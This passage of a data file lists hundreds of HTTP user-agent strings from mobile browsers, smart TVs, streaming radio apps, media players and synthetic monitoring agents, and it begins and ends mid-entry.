RuxitSynthetic/1.0 v2623553364580935955 t9153810266204246498 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 RuxitSynthetic/1.0 v2388567177307589727 t1149961279716100549 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v7959468983017980453 t7034606369950548413 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v3866644436038394198 t2818120325001311098 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v5074017692 t4969878276061334900 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v6686967755449694274 t4520301449659322587 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 RuxitSynthetic/1.0 v6586765015417005803 t860862242214111558 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3)","Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Mobile Safari/537.36 EdgA/97.0.1072.78","Mozilla/5.0 (Linux; Android 9; ASUS_I001D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.60 Mobile Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:68.0) Gecko/20100101 Firefox/68.0 Waterfox/56.6.2022.01","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.2549.44 Safari/537.36","Mozilla/5.0 (Linux; U; Android 5.0; en-US; SM-N900 Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.0.1306 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; moto g(9) play Build/RPXS31.Q2-58-17-4-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-R875F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/1.2. Chrome/90.0.4430.210 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Nokia 5.4 Build/RKQ1.210303.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36","iTunes/9.1.1 (Windows; Microsoft Windows 7 x64 Home Premium Edition Service Pack 1 (Build 7601)) AppleWebKit/531.22.7","Mozilla/5.0 (Linux; Android 10; LM-K410) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-A326B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; SM-G965F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","ExoPlayerDemo/2.0 (Linux;Android 5.1.1) ExoPlayerLib/1.5.6","Mozilla/5.0 (Linux; Android 11; moto g 5G plus Build/RPNS31.Q4U-39-27-9-2-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; arm_64; Android 7.1.2; Swift 2 X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.116 YaBrowser/22.1.1.215.00 SA/3 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; VKY-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; YAL-L21 Build/HUAWEIYAL-L61; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 6.0.1; vivo 1606 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; SOV35 Build/41.3.C.1.203; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; vivo 1612 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 6.0; Redmi Note 4 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-G770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; M2103K19G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Infinix X662 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; CPH1933 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-N975F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.61 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; SM-C710F Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","AppleCoreMedia/1.0.0.19K547 (Apple TV; U; CPU OS 15_3 like Mac OS X; pt_br)","Mozilla/5.0 (Linux; Android 9; JSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0 TO-Browser/TOB7.96.0.301_04","Mozilla/5.0 (Linux; arm_64; Android 10; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.116 YaBrowser/22.1.2.119.00 SA/3 Mobile Safari/537.36","NSPlayer/12.00.22549.1500 WMFSDK/12.00.22549.1500","Mozilla/5.0 (Linux; Android 7.0; G3311) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-N981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 OpenWave/98.4.4113.14","Mozilla/5.0 (Linux; Android 7.0; SM-G920F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","radio.dk/3990 CFNetwork/758.5.3 Darwin/15.6.0","Mozilla/5.0 (Linux; Android 8.1.0; DRA-LX3 Build/HUAWEIDRA-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-G981U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-T720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36","AppleCoreMedia/1.0.0.19D50 (iPhone; U; CPU OS 15_3 like Mac OS X; fr_be)","Dalvik/2.1.0 (Linux; U; Android 7.0; 15 Plus Build/NRD90M)","Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; RMX1911 Build/QKQ1.200209.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; CPH2185 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Redmi 8A Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 11; SHG03 Build/SB240)","Mozilla/5.0 (Linux; Android 9; SM-J530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]","Mozilla/5.0 (Linux; Android 9; ASUS_X017DA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; BAH2-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36","Mozilla/5.0 (Linux; Android 6.0.1; SM-G600FY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 12; SM-A426B Build/SP1A.210812.016)","Mozilla/5.0 (Linux; Android 10; moto e (XT2052DL)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; BAC-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; 7.0; PSP5518DUO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J330FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]","AppleCoreMedia/1.0.0.19K547 (Apple TV; U; CPU OS 15_3 like Mac OS X; es_xl)","Mozilla/5.0 (Linux; Android 8.0.0; AGS2-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","AppleCoreMedia/1.0.0.16F8155 (iPod touch; U; CPU OS 12_3 like Mac OS X; en_gb)","Dalvik/2.1.0 (Linux; U; Android 12; SM-G9880 Build/SP1A.210812.016)","NSPlayer/12.02.19041.1503 WMFSDK/12.02.19041.1503","Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 OPR/67.1.3508.63168","Simple%20Radio/1381 CFNetwork/811.5.4 Darwin/16.7.0","Radio/9059 CFNetwork/978.6 Darwin/18.7.0 (x86_64)","Mozilla/5.0 (Linux; Android 8.1.0; PSP3515DUO_RU Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 YaBrowser/21.1.0.188 (lite) Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; POT-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 OPX/1.5.0","Mozilla/5.0 (Linux; Android 11; T790Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Redmi Note 9S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 OPR/67.1.3508.63168","Mozilla/5.0 (Linux; Android 11; CPH1951) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","WinampMPEG/5.11 (SSL Proxy for client IP: 87.15.245.152 / Country: IT)","Mozilla/5.0 (Linux; Android 8.1.0; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Nokia Streaming Box 8000 Build/QTT8.201201.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36","Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.41 (KHTML, like Gecko) Large Screen Safari/537.41 LG Browser/7.00.00(LGE; 55LB656V-ZN; 05.05.70; 1); webOS.TV-2014; LG NetCast.TV-2013 Compatible (LGE, 55LB656V-ZN, wireless)","Mozilla/5.0 (Linux; Android 10; M20 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; moto g(8) power Build/RPES31.Q4U-47-35-11; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 12; SM-N986W Build/SP1A.210812.016)","ExoPlayerDemo/1.2.83 (Linux;Android 9) ExoPlayerLib/2.8.2","Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Mi MIX 2S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-F127G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-G965F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 Instagram 221.0.0.13.118 Android (29/10; 420dpi; 1080x2094; samsung; SM-G965F; star2lte; samsungexynos9810; it_IT; 349090917)","Mozilla/5.0 (Linux; Android 12; V2036) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","AppleCoreMedia/1.0.0.21D49 (Macintosh; U; Intel Mac OS X 12_2; hu_hu)","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.43 Unique/94.7.5836.37","Mozilla/5.0 (Linux; Android 12; SM-T875 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Safari/537.36 Replaio/2.9.2","Mozilla/5.0 (Linux; Android 11; XQ-BQ52 Build/61.0.A.23.20; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-T865 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36 GLS/99.10.2119.20","Simple%20Radio/1631 CFNetwork/1329 Darwin/21.3.0","Mozilla/5.0 (Linux; Android 9; ASUS_X00TD Build/PKQ1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]","Simple%20Radio/1711 CFNetwork/1331.0.3 Darwin/21.4.0","Mozilla/5.0 (Linux; Android 11; Mi 9T Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/342.0.0.37.119;]","Mozilla/5.0 (Linux; Android 10; RMX1821 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 Line/11.8.3/IAB","Mozilla/5.0 (Linux; Android 11; SM-A215W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 9; TX6 mini Build/PPR1.181005.003)","AppleCoreMedia/1.0.0.19H1713 (Macintosh; U; Intel Mac OS X 10_15_7; ja_jp)","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4872.0 Safari/537.36","Mozilla/5.0 (Linux; 8.1.0; Lenovo TB-7104I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; moto e5 play Build/ODPS27.91-121-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Reflect Build/OPM1.171019.011)","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.87 YaBrowser/21.1.0.188 (lite) Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; MRD-LX1F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.75 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 12; sdk_gphone64_x86_64 Build/SE1A.211212.001.B1)","Mozilla/5.0 (Linux; Android 4.4.2; K016 Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Safari/537.36","Mozilla/5.0 (Linux; Android 9; AFTR Build/PMAIN1.2211N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0","AppleCoreMedia/1.0.0.19K547 (Apple TV; U; CPU OS 15_3 like Mac OS X; es_es)","Mozilla/5.0 (Linux; Android 10; POT-LX1 Build/HUAWEIPOT-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-G985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","AppleCoreMedia/1.0.0.21D49 (Macintosh; U; Intel Mac OS X 12_2; es_es)","Mozilla/5.0 (Linux; Android 9; KFTRPWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/96.3.1 like Chrome/96.0.4664.175 Safari/537.36","%CE%A1%CE%B1%CE%B4%CE%B9%CF%8C%CF%86%CF%89%CE%BD%CE%BF/1.3.0 CFNetwork/1329 Darwin/21.3.0","iTunes/4.7.1 (Linux; N; Debian; x86_64-linux; SV; utf8) SqueezeCenter, Squeezebox Server, Logitech Media Server/8.3.0/1643819467","Mozilla/5.0 (Linux; Android 9.0; Build/PTO9.210120.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.225 Safari/537.36 CrKey/1.56.500000","Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D50 [FBAN/FBIOS;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/15.3;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5]","Mozilla/5.0 (Linux; Android 11; 4187D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Lenovo YT-X705F Build/QKQ1.191224.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Safari/537.36","AppleCoreMedia/1.0.0.19K547 (Apple TV; U; CPU OS 15_3 like Mac OS X; ru_ru)","Mozilla/5.0 (Linux; Android 7.0; GS270 plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Mi A2 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","iTunes/12.2.2 (Macintosh; OS X 10.10) AppleWebKit/600.1.25","Mozilla/5.0 (Linux; Android 8.1.0; Hisense F23 PLUS) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D50 [FBAN/FBIOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/15.3;FBSS/2;FBID/phone;FBLC/en_GB;FBOP/5]","Simple%20Radio/1578 CFNetwork/1327.0.4 Darwin/21.2.0","Mozilla/5.0 (Linux; Android 10; BLA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 GLS/98.10.1599.100","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/96.2.18 like Chrome/96.0.4664.175 Safari/537.36","AppleCoreMedia/1.0.0.17G2208 (Macintosh; U; Intel Mac OS X 10_13_6; fr_fr)","Mozilla/5.0 (Linux; Android 10; SM-J400M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 9; CoolMinttA3 Build/PPR1.180610.011)","Mozilla/5.0 (Linux; Android 11; CPH2067 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]","LG-D802/V30f Player/LG Player 1.0 for Android 5.0.2 (stagefright alternative)","Mozilla/5.0 (Linux; Android 6.0; MI 5C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; CPH1859 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Zenfone 4 Max Build/QQ3A.200905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; SM-A750GN Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-A205F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; SM-J710F Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","AppleCoreMedia/1.0.0.20G415 (Macintosh; U; Intel Mac OS X 11_6_3; en_gb)","Mozilla/5.0 (Linux; Android 11; CPH1989 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","AppleCoreMedia/1.0.0.19C63 (iPad; U; CPU OS 15_2_1 like Mac OS X; th_th)","Mozilla/5.0 (Linux; Android 9; TA-1021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36","Mozilla/5.0 (Linux; Android 10; C22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Le Smooth FR Build/OPM2.171019.012)","Mozilla/5.0 (Linux; Android 9; MI MAX 3 Build/PKQ1.181007.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; CPH2067 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/351.0.0.38.117;]","Mozilla/5.0 (Linux; Android 9; INE-LX2; HMSCore 6.3.0.326; GMSCore 21.48.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 HuaweiBrowser/11.1.5.311 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 11; en-gb; CPH1911 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/45.8.3.1","Mozilla/5.0 (Linux; Android 8.0.0; Lenovo L38011 Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36","Dalvik/1.6.0 (Linux; U; Android 4.0.4; ZTE T82 Build/IMM76I)","Mozilla/5.0 (Linux; Android 8.1.0; Pixel C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36 OPR/59.1.2926.54067","Mozilla/5.0 (Linux; Android 11; XQ-AU52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; LM-Q850) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 8.1.0; vivo S1 Build/OPM8.190605.005)","Mozilla/5.0 (Linux; Android 10; MI 8 Lite Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; Nokia X10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; CPH2235 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; CPH1923 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]","Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36 HbbTV/1.5.1 (+DRM; Philips; 32PFS6855/12; 202.003.188.011; ; _TV_MT9288_2020;) FVC/4.0 (Philips; com.tpv-tech.TPM207E;) LaTivu_1.0.1_2020","Mozilla/5.0 (Linux; Android 10; VOG-L29 Build/HUAWEIVOG-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 6.0.1; SM-T805) AppleWebKit/537.36 